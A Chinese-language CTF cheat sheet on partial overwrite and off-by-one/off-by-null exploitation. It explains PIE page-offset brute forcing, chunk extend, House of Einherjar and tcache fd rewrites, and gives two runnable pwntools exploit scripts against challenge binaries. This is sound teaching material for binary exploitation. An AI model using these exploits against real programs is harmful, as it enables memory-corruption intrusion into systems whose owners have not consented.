---
title: partial overwrite 与受限单字节 / OOB 写
category: pwn
tags: [partial overwrite, off-by-one, off-by-null, chunk extend, tcache poisoning]
signals: [输入长度只比缓冲区多 1 字节, 只能改写地址的最低 1 到 2 个字节, 程序没有任何输出函数无法泄漏地址, PIE 开启但目标与返回地址同页, 堆上能写 size 加 1 字节形成 off by null, 堆 chunk 的 size 尾字节是 0x01 的 prev_inuse 位, 目标地址与当前指针共享高 6 字节]
difficulty: medium
source: "CTF-Wiki Off-By-One / Chunk Extend and Overlapping / how2heap"
tools: [pwntools, gdb, pwndbg, ROPgadget]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- `read(0, buf, sizeof(buf) + 1)`、`strcpy`、`gets` 造成**只多 1 字节**的溢出。
- 程序开了 **PIE**，但目标与当前返回地址**在同一 4KB 页**（高字节不用改）。
- 程序把 `write` / `puts` 全关掉，**没有任何输出**，libc 地址泄漏无从谈起。
- 堆题里只能写 `size + 1` 字节：经典 `off-by-null` 打在下一 chunk 的 `size` 最低字节。
- 地址里含 `\x00`，`strcpy` 类函数会在 `00` 处截断 —— 必须做 partial overwrite。
- 32 位程序返回地址只有低 2 字节有效可改（如 `0x5661xxxx`）。
- `tcache` 的 `fd` 只能覆盖 1~2 字节，就能把下一次 malloc 引到目标位置。

## 二、原理

### 1. partial overwrite 的本质

写入默认从**低地址向高地址**进行。只能写 1~2 字节时，就只改了地址的最低 8/16 位，**高位保持原值**。

- **低 12 位（页内偏移）由二进制自身决定，不受 PIE/ASLR 影响**。
- 因此只要目标与原地址**同页**，无需泄漏就能命中。
- 不同页时，第 3~4 个 nibble（`0x?000`）随机 —— PIE 下最多爆破 16 次。

```
原返回地址 : 0x55a1b2c3d4e5
只覆盖低 2B: 0x55a1b2c3????      ← 高 6 字节原样保留
目标 win() : 页内偏移 = elf.sym['win'] & 0xfff
```

### 2. 三种典型场景

#### (a) 栈上 partial overwrite

```python
payload = b'A' * OFFSET + p16(0x1234)   # 只覆盖低 2 字节
```

返回地址与目标（`win`、`main+0x??`、`.fini` 里的 gadget）同页。
无 PIE 时低 16 位完全确定，**一次命中**；有 PIE 时用 `(hi << 12) | off` 爆破。

#### (b) 堆上 off-by-null 打在 size 上

| 原 size | 写入 `\x00` 后 | 后果 |
| --- | --- | --- |
| `0x21` | `0x00` | `PREV_INUSE` 被清 → **House of Einherjar / 后向合并** |
| `0x2e1` | `0x200` | chunk 变小 → **chunk extend / overlapping** |
| `0x71` | `0x00` | free 时 `malloc_printerr` 崩溃（size < MINSIZE） |

- **chunk extend**：把 `0x2e1 → 0x200` 后 free，再 malloc 得到"缩小"的 chunk，但物理上仍覆盖到后面 → 与后续 chunk 重叠。
- **House of Einherjar**：清 `PREV_INUSE` 后，free 会按伪造的 `prev_size` 向前合并到任意位置。

#### (c) 堆指针的低字节改写

```python
fd_new = target & 0xffff        # tcache / fastbin 的 fd 只改低 2 字节
```

前提：**target 与当前 fd 共享高 6 字节**（同一 64KB 段）。chunk 相邻时最常用，可把 `next` 指到同堆区其它 chunk 的 data 起点做 overlapping。

### 3. 成功率与爆破策略

| 可写字节数 | PIE 下命中率 |
| --- | --- |
| 1 字节 | 1/1（只改页内偏移且同页） |
| 2 字节 | 1/16（`0x?000` 随机） |
| 无 PIE | 恒为 1/1 |

失败即 `SIGSEGV`，**必须重新 fork/exec 子进程**才能重试（同一进程地址不变）。

## 三、解题步骤

1. **量准偏移**
```bash
cyclic 200 | ./pwn            # 拿到 0x616161xx
python -c "from pwn import *;print(cyclic_find(0x6161616b))"
```
2. **确认能写几字节**：`read` 长度 − `OFFSET`。
3. **算目标低字节**
```python
win_off = elf.sym['win'] & 0xfff      # 页内偏移，PIE 下恒定
target  = (hi << 12) | win_off        # hi 用于爆破
```
4. **判断是否需要爆破**：无 PIE → 全知；有 PIE → 试 16 次。
5. **写 payload**：用 `send` 而不是 `sendline`，避免多一个 `\n` 落到关键字段。
6. **失败重试**：封装 `attempt()` + `for hi in range(16)`。

## 四、可直接运行的 exp 脚本

### 场景 A：栈上 partial overwrite 跳 `win()`（PIE）

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./pwn')
context.log_level = 'info'

OFFSET  = 0x28                 # buf → 返回地址，用 cyclic 量出来
WIN_OFF = elf.sym['win'] & 0xfff

def start():
    return remote('HOST', 1337) if args.REMOTE else process(elf.path)

def attempt(hi):
    io = start()
    payload = b'A' * OFFSET + p16((hi << 12) | WIN_OFF)
    io.send(payload)
    try:
        out = io.recvrepeat(1.0)
    except EOFError:
        return None
    return out if (b'flag' in out or b'{' in out) else None

for hi in range(16):
    r = attempt(hi)
    if r:
        log.success(r)
        break
else:
    log.failure('all 16 tries failed — check OFFSET / same-page assumption')
```

### 场景 B：堆 off-by-null 造成 chunk overlap（chunk extend）

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./heapnote')
libc = ELF('./libc-2.31.so')
context.log_level = 'info'

io = process(elf.path)

def add(size, data=b''):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    if data:
        io.sendafter(b'data: ', data)

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendafter(b'data: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())

# 1) 布置：a 的写入长度 = size + 1
add(0x18, b'A' * 0x18)        # chunk a, size 0x20
add(0x100)                    # chunk b, size 0x110
add(0x100)                    # chunk c，防止 b 与 top 合并

# 2) off-by-null 改写 b 的 size 低字节：0x111 -> 0x100
edit(0, b'A' * 0x18 + b'\x00')

# 3) free(b)：内核认为 b 只有 0x100，尾部仍挂在 next chunk 辖区
free(1)

# 4) 再次申请 0x100，拿到与 c 起始重叠的 chunk
add(0x100, b'B' * 0x8)

# 5) 后续：用重叠 chunk 改写 c 的 fd / size，走 tcache poisoning 或 unsorted bin leak
io.interactive()
```

## 五、常见坑 / 变体

1. **`sendline` 多出一个 `\n`**：若 `OFFSET` 后只允许 2 字节，`\n` 会覆盖下一个字段；务必用 `send`。
2. **`strcpy` 遇 `\x00` 截断**：partial overwrite 不能带 `00`，挑低字节非 0 的目标。
3. **off-by-null 会同时清 `PREV_INUSE`**：后续 free 走后向合并，需保证 fake chunk 满足 `chunksize(p) == prev_size(next_chunk(p))`。
4. **2.34+ 检查更严**：`_int_free` 中 `chunksize(p) != prev_size(next_chunk(p))` 直接 abort；要么让 `prev_size` 可写，要么改走 tcache 路径。
5. **PIE 的 `0x?000` 随机位**：不能用 `elf.sym['win'] & 0xffff` 直接拼，必须 `& 0xfff` 再与爆破出的 `hi` 组合。
6. **`tcache` 的 key 字段（2.29+）**：只改 `fd` 不改 `key` 时，二次 malloc 会做 `e->key == tcache_key` 检查；需一并改写或先清 `key`。
7. **fastbin 改 fd 的 size 检查**：`target` 必须满足对应的 `size` 索引合法，否则 `malloc` 直接报错。
8. **不能在同一进程内重试**：ASLR 只在 exec 时变，失败就重开进程。

## 六、参考来源

- [CTF-Wiki: 堆中的 Off-By-One](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/)
- [CTF-Wiki: Chunk Extend and Overlapping](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/)
- [CTF-Wiki: House Of Einherjar](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/)
- [how2heap: house_of_einherjar.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_einherjar.c)
- [how2heap: tcache_poisoning.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c)
- [pwntools 文档](https://docs.pwntools.com/en/stable/)
- [how2heap 仓库（全部堆技巧的可运行 PoC）](https://github.com/shellphish/how2heap)
